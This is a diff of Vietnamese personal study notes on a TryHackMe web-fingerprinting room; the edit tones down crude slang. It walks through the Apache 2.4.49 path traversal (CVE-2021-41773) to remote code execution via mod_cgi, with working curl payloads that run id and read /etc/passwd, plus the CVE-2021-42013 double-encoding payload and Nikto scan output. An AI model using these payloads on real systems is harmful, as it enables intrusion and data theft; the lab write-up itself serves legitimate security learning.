-Khi mày gửi `.%2e/` (một dấu chấm, theo sau là chữ `%2e` được encode từ dấu chấm, rồi đến dấu gạch chéo), cái màng lọc nhìn vào thấy `.%2e/` đéo giống `../` nên nó nhắm mắt cho qua. Đến khi Apache ném cái URL này xuống cho hệ điều hành, OS nó tự hiểu `.%2e/` chính là `../`. Thế là màng lọc bị bypass, mày lội ngược thư mục cái một!
+Khi mày gửi `.%2e/` (một dấu chấm, theo sau là chữ `%2e` được encode từ dấu chấm, rồi đến dấu gạch chéo), cơ chế lọc nhìn vào thấy `.%2e/` không giống `../` nên nó cho qua. Đến khi Apache ném cái URL này xuống cho hệ điều hành, OS nó tự hiểu `.%2e/` chính là `../`. Thế là màng lọc bị bypass, mày lội ngược thư mục cái một!
 
 > [!NOTE]
 > <u>-cái này khá giống bypass blacklist, thông thường apache có màng lọc chặn url có *.../*</u>
 > <u>-nhưng mà có lỗi ở hàm trên, là cái url chưa giải mã hoàn toàn thì đã cho đi qua màng lọc rồi, nên nó không lọc được .%2e == ../</u>
 
-Bản thân cái trò này mới chỉ là chọc ngoáy đọc file (directory traversal for file read) thôi. Cái làm nên độ nguy hiểm vãi lồn của nó là khi nó kết hợp với thằng `mod_cgi`. Cái đường dẫn `/cgi-bin/` cho phép chạy lệnh CGI. Khi mày dùng trò lội ngược thư mục trỏ thẳng tới một cái file thực thi như `/bin/sh`, thằng Apache sẽ ngu ngơ đem nó ra chạy như một đoạn script CGI và bơm luôn cái nội dung HTTP POST body của mày vào `stdin` (đầu vào tiêu chuẩn) của cái script đó. Bùm! RCE.
+Bản thân cái trò này mới chỉ là chọc ngoáy đọc file (directory traversal for file read) thôi. Cái làm nên độ nguy hiểm cực cao của nó là khi nó kết hợp với `mod_cgi`. Cái đường dẫn `/cgi-bin/` cho phép chạy lệnh CGI. Khi mày dùng trò lội ngược thư mục trỏ thẳng tới một cái file thực thi như `/bin/sh`, thằng Apache sẽ thực thi nó như một đoạn script CGI và bơm luôn cái nội dung HTTP POST body của mày vào `stdin` (đầu vào tiêu chuẩn) của cái script đó. Bùm! RCE.
 
 > [!question]
 > <u> - thứ nhất là mod_cgi là gì ?trong một ứng dụng  sử dụng apache ,php đều cso cái thư mục này à,  đường dẫn /cgi-bin/ </u>
 > ![[Pasted image 20260818132150.png]]
 
-#### Tại sao đéo có cờ `--path-as-is` thì ăn lz?
+#### Tại sao không có cờ `--path-as-is` thì không khai thác được?
 
-Thằng `curl` mặc định nó khôn lỏi, nó tự chuẩn hóa (normalize) cái URL trước khi bắn đi. Nếu đéo gắn cờ `--path-as-is`, thằng `curl` nó sẽ tự dọn sạch mấy cái `.%2e/` ngay trên máy mày trước cả khi gửi đi, làm server chỉ nhận được một cái path bình thường đéo có bẫy gì cả. Cái cờ này lệnh cho `curl`: "Bố mày gõ cái lồn gì thì gửi nguyên xi cái đấy đi, cấm sửa!".
+Thằng `curl` mặc định nó tự chuẩn hóa (normalize) URL trước khi gửi đi. Nếu không gắn cờ `--path-as-is`, `curl` sẽ tự dọn sạch các đoạn `.%2e/` ngay trên máy mày trước cả khi gửi đi, làm server chỉ nhận được một path bình thường không có payload gì cả. Cờ này ra lệnh cho `curl`: "Người dùng gõ gì thì gửi nguyên xi cái đấy đi, không được tự ý sửa!".
 
-> **CẢNH BÁO:** Nếu mày xài trò lội ngược thư mục mà thấy server chửi `403` thay vì chạy lệnh, thì 99% là do mày quên mẹ cái cờ `--path-as-is` này. Thằng `curl` âm thầm sửa URL, nên con server đéo bao giờ nhìn thấy mấy cái dấu chấm bị encode của mày.
+> **CẢNH BÁO:** Nếu mày xài trò lội ngược thư mục mà thấy server chửi `403` thay vì chạy lệnh, thì 99% là do mày quên cờ `--path-as-is` này. Thằng `curl` âm thầm sửa URL, nên server không bao giờ nhìn thấy các dấu chấm bị encode của mày.
 
 #### Khai thác thực tế (Exploitation)
 
-Mày đã check xong con Apache 2.4.49 nằm tơ hơ ở port 8080, thằng `mod_cgi` thì đang vẫy gọi ở `/cgi-bin/`. Mày có sẵn đường băng bay thẳng tới RCE (chạy lệnh từ xa) mà đéo cần đăng nhập mẹ gì sất.
+Mày đã check xong con Apache 2.4.49 nằm tơ hơ ở port 8080, thằng `mod_cgi` thì đang vẫy gọi ở `/cgi-bin/`. Mày có sẵn đường bay thẳng tới RCE (chạy lệnh từ xa) mà không cần đăng nhập gì cả.
 
 **Bước 1: Chạy thử RCE**
-Lội ngược từ `/cgi-bin/` về tận `/bin/sh` bằng 4 cục `.%2e/`. Xong ném lệnh shell vào phần POST body. Cái đoạn `echo Content-Type: text/plain; echo;` ở đầu là bắt buộc theo chuẩn của bọn CGI nhé. Thằng Apache cần một khối HTTP header hợp lệ trước phần body, đéo có là nó nôn ra lỗi 500. Cái lệnh `echo` chổng trơ kia là để tạo ra một dòng trống phân cách:
+Lội ngược từ `/cgi-bin/` về tận `/bin/sh` bằng 4 cục `.%2e/`. Xong ném lệnh shell vào phần POST body. Cái đoạn `echo Content-Type: text/plain; echo;` ở đầu là bắt buộc theo chuẩn của bọn CGI nhé. Thằng Apache cần một khối HTTP header hợp lệ trước phần body, không có là nó trả về lỗi 500. Cái lệnh `echo` chổng trơ kia là để tạo ra một dòng trống phân cách:
 
 ```text
 root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
@@ -482,7 +482,7 @@ Xác nhận có RCE cmnr! Cái tiến trình Apache đang chạy dưới quyền
 
 
 **Bước 2: Móc thông tin tài khoản hệ thống**
-Có RCE rồi thì mày đọc được bất kỳ cái file lồn nào mà thằng user `daemon` có quyền đọc. Moi cái file `/etc/passwd` ra để xem trong cái container đó có những thằng nào:
+Có RCE rồi thì mày đọc được bất kỳ file nào mà user `daemon` có quyền đọc. Moi cái file `/etc/passwd` ra để xem trong cái container đó có những thằng nào:
 
 ```text
 root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
@@ -495,7 +495,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
 
 ```
 
-Cái tài khoản đéo phải root đầu tiên chính là `daemon`, cũng là thằng đang gánh cái tiến trình Apache. Điều này xác nhận con server đéo chạy quyền root.
+Tài khoản không phải root đầu tiên chính là `daemon`, cũng là tiến trình đang chạy Apache. Điều này xác nhận server không chạy quyền root.
 
 **Bước 3: Hốc cái Flag**
 ```text
@@ -505,7 +505,7 @@ root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e
 ```
 
 > **Thông tin thêm:**
-> Con CVE-2021-41773 này chỉ cắn đúng bản Apache 2.4.49 thôi. Lên bản 2.4.50 tụi nó tung ra bản vá nửa mùa, chặn được dấu chấm encode 1 lần nhưng lại đéo chặn được trò encode 2 lần (double-encoding). Thế là đẻ thêm con hàng **CVE-2021-42013** bypass bằng quả payload `%%32%65%%32%65/`. Phải từ bản 2.4.51 trở đi tụi nó mới vá triệt để. Túm lại là cứ thấy cái header lòi ra `Server: Apache/2.4.49` hoặc `Apache/2.4.50` thì vác ngay trick này ra mà phệt.
+> Con CVE-2021-41773 này chỉ cắn đúng bản Apache 2.4.49 thôi. Lên bản 2.4.50 tụi nó tung ra bản vá nửa mùa, chặn được dấu chấm encode 1 lần nhưng lại không chặn được trò encode 2 lần (double-encoding). Thế là đẻ thêm con hàng **CVE-2021-42013** bypass bằng quả payload `%%32%65%%32%65/`. Phải từ bản 2.4.51 trở đi tụi nó mới vá triệt để. Túm lại là cứ thấy cái header lòi ra `Server: Apache/2.4.49` hoặc `Apache/2.4.50` thì vác ngay trick này ra mà phệt.
 
 
 > [!NOTE] tổng kết lại
@@ -515,7 +515,7 @@ root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e
 > - ban đầu recon phiên bản apache, sau đó tìm các cve gắn với nó, và tìm cách khai thác.Đơn giản vậy thôi
 
 # 6-Automation
-Làm tay (manual fingerprinting) thì giúp mày hiểu bản chất cái tín hiệu đéo nào quan trọng và tại sao.<u> Nhưng lúc đi làm pentest thực tế với một cái scope to chà bá chứa vài chục host, thì mày cứ quăng con hàng Nikto vào quét dạo lượt đầu cho lẹ; nó tự động chọc ngoáy từng dịch vụ, soi HTTP header, và lôi ra mấy cái dấu hiệu hệ thống hoặc cấu hình ngu mà mày đéo cần phải tự tay gõ dòng payload nào.</u>
+Làm tay (manual fingerprinting) thì giúp mày hiểu bản chất tín hiệu nào quan trọng và tại sao.<u> Nhưng lúc đi làm pentest thực tế với một scope lớn chứa vài chục host, thì mày cứ dùng Nikto quét dạo lượt đầu cho nhanh; nó tự động rà soát từng dịch vụ, soi HTTP header, và chỉ ra mấy dấu hiệu hệ thống hoặc lỗi cấu hình mà mày không cần phải tự tay gõ từng payload.</u>
 
 > [!NOTE] Title
 > Ok dùng con hàng **Nikto** để automation quét , hay đấy chứ
@@ -549,7 +549,7 @@ root@tryhackme:~# nikto -h http://10.49.174.205:3000
 
 ```
 
-Đéo có cái banner `Server` nào cả; vì thằng Express mặc định đéo bô bô cái đó ra. Nhưng có 2 tín hiệu chốt kèo xác nhận hệ thống: `x-powered-by: Express` và cái cookie session `connect.sid`. Quét xong còn được bonus thêm thông tin thơm lây là cái cookie đéo thèm bật cờ bảo mật `httponly`.
+Không có banner `Server` nào cả, vì Express mặc định không hiển thị cái đó ra. Nhưng có 2 tín hiệu chắc chắn xác nhận hệ thống: `x-powered-by: Express` và cookie session `connect.sid`. Quét xong còn được biết thêm thông tin là cookie không bật cờ bảo mật `httponly`.
 
 #### Port 3001 - Next.js
 
@@ -573,7 +573,7 @@ root@tryhackme:~# nikto -h http://10.49.174.205:3001
 
 ```
 
-Thấy `x-powered-by: Next.js` là xác nhận mẹ nó framework luôn. Ba cái header `x-nextjs-*` chứng tỏ cái App Router đang chạy ở mode production, đây chính là cái điều kiện mĩ mãn để đâm con CVE-2025-29927.
+Thấy `x-powered-by: Next.js` là xác nhận chính xác framework luôn. Ba cái header `x-nextjs-*` chứng tỏ cái App Router đang chạy ở mode production, đây chính là cái điều kiện mĩ mãn để đâm con CVE-2025-29927.
 
 #### Port 8000 - Django
 
@@ -622,7 +622,7 @@ Dòng `Server: Apache/2.4.49 (Unix)` là cái tín hiệu vả thẳng mặt con
 
 
 **Chốt lại:**
-Thằng Nikto bóc phốt cả 4 stack chưa tới một phút. Riêng quả Apache, nó dâng tận mồm cái phiên bản chuẩn xác, đéo cần mày phải đi soi mói rà quét gì thêm nữa<u>. Còn với MERN và Django, nhận diện stack thì ngon đấy, nhưng Nikto đéo có tool mẫu để quét mấy cái lỗi injection ở tầng ứng dụng logic đâu</u>. Và đó chính là lúc mấy cái trò mò mẫm bằng tay mà tao thông não cho mày ở Task 2 với Task 4 bắt đầu phát huy tác dụng.
+Thằng Nikto bóc phốt cả 4 stack chưa tới một phút. Riêng quả Apache, nó dâng tận mồm cái phiên bản chuẩn xác, không cần mày phải đi soi mói rà quét gì thêm nữa<u>. Còn với MERN và Django, nhận diện stack thì tốt đấy, nhưng Nikto không có mẫu sẵn để quét mấy lỗi injection ở tầng ứng dụng logic đâu</u>. Và đó chính là lúc mấy cái trò mò mẫm bằng tay mà tao thông não cho mày ở Task 2 với Task 4 bắt đầu phát huy tác dụng.
 
 > [!NOTE] Title
 > - hmmmmm, đại khái là con vợ nikto này giúp mình recon, như với thằng apache nó nôn luôn ra phiên bản , mình chỉ cần search các cve liên quan là có thể exploit
@@ -633,16 +633,16 @@ Thằng Nikto bóc phốt cả 4 stack chưa tới một phút. Riêng quả Apa
 
 
 # 7- tư duy cốt lõi đúc rút được
-Đm nãy giờ chửi nhau mỏi mồm, giờ chốt hạ lại cho mày mấy cái tư duy cốt lõi. Đi làm pentest hay săn bug thì<u> ốp nguyên mấy cái mindset này vào</u> não, đéo bao giờ lo chết đói:
+Sau khi tìm hiểu xong, giờ chốt lại cho mày mấy cái tư duy cốt lõi. Đi làm pentest hay săn bug thì<u> giữ nguyên mấy cái mindset này</u>, không bao giờ lo thiếu hướng đi:
 
-1. **Biết mình biết ta, đéo quăng payload bừa bãi (Fingerprinting)**
-Trước khi đấm nhau phải biết thằng kia xài võ gì. Đéo bao giờ nhắm mắt ném payload bừa. Phải<u> soi từ cái HTTP Header, cái Cookie, đến cách nó nôn ra thông báo lỗi 404 hay 500</u>. Thấy Express thì lôi bài Prototype ra, thấy Apache 2.4.49 thì ốp ngay bài lội thư mục.
+1. **Biết mình biết ta, không quăng payload bừa bãi (Fingerprinting)**
+Trước khi kiểm thử phải biết mục tiêu dùng công nghệ gì. Không bao giờ nhắm mắt ném payload bừa. Phải<u> soi từ cái HTTP Header, cái Cookie, đến cách nó nôn ra thông báo lỗi 404 hay 500</u>. Thấy Express thì lôi bài Prototype ra, thấy Apache 2.4.49 thì ốp ngay bài lội thư mục.
 
 > [!NOTE] Title
 > hmmm, tức là sao nhể? soi cái http header thì tao hiểu , còn cái cookie và thông báo lỗi tao cũng hiểu, nhưng tao thấy 2 thằng đấy chỉ áp udngj cho các trường hợp cố định thui
 
-2. **Nhìn thấu bản chất, đéo học vẹt (Root Cause)**
-Mày thấy đấy, 4 cái stack là 4 kiểu chết đéo giống nhau:
+2. **Nhìn thấu bản chất, không học vẹt (Root Cause)**
+Mày thấy đấy, 4 cái stack là 4 kiểu lỗi không giống nhau:
 
 * Thằng NodeJS chết vì cơ chế kế thừa gen gốc mù quáng của Javascript.
 * Thằng Next.js chết vì tin tưởng cái tem header nội bộ tự chế.
@@ -654,13 +654,13 @@ Nắm được cái lõi này thì mày gặp framework lạ cũng biết đư�
 > tức là mày phải rút ra được cái logic chung của các lỗ hổng ấy hả??
 
 
-3. **Chân lý ngàn năm: Đéo bao giờ tin Input**
-*Mọi lỗ hổng nãy giờ mày học đều chui ra từ một lỗ*:<u> Thằng dev tin rằng user sẽ nhập đúng cái nó muốn.</u> Gửi JSON có key ma giáo, gửi header fake mác nội bộ, gửi URL lội thư mục... Dev đéo bọc filter kỹ là vỡ mồm. Tư duy của mày là phải chọc ngoáy vào tất cả những cái đầu vào (input) để xem nó có hở sườn không.
+3. **Chân lý ngàn năm: Không bao giờ tin Input**
+*Mọi lỗ hổng nãy giờ mày học đều chui ra từ một lỗ*:<u> Thằng dev tin rằng user sẽ nhập đúng cái nó muốn.</u> Gửi JSON có key ma giáo, gửi header fake mác nội bộ, gửi URL lội thư mục... Dev không bọc filter kỹ là dính lỗi ngay. Tư duy của mày là phải chọc ngoáy vào tất cả những cái đầu vào (input) để xem nó có hở sườn không.
 
 > [!NOTE] Tư duy chọc ngoáy input :>
 > Lỗi là dev luôn nghĩ rằng input sẽ nhập theo cách nó muốn, vậy thì luôn có tư duy chọc ngoáy input
 
 3. **Tool làm culi, não người làm chủ**
-Mấy con tool như Nikto quét dạo cực nhanh, dâng tận mồm cho mày mấy cái version server cũ rích dính CVE. Nhưng với những cái lỗi logic tầng ứng dụng kiểu bypass middleware hay Prototype Pollution, đéo có cái tool nào lươn lẹo bằng não người được. Dùng tool để càn quét diện rộng, dùng tay và não để đục những lỗ sâu.
+Mấy con tool như Nikto quét dạo cực nhanh, dâng tận mồm cho mày mấy cái version server cũ rích dính CVE. Nhưng với những cái lỗi logic tầng ứng dụng kiểu bypass middleware hay Prototype Pollution, không có tool nào linh hoạt bằng tư duy con người được. Dùng tool để càn quét diện rộng, dùng tay và não để đục những lỗ sâu.
 
-Nuốt trôi 4 cái gạch đầu dòng này thì mày chính thức có tư duy của một thằng làm an toàn thông tin thực thụ rồi đấy. Nghỉ ngơi cho não nó nảy số đi con chó.
+Nuốt trôi 4 cái gạch đầu dòng này thì mày chính thức có tư duy của một thằng làm an toàn thông tin thực thụ rồi đấy. Nghỉ ngơi cho thoải mái đầu óc nhé.
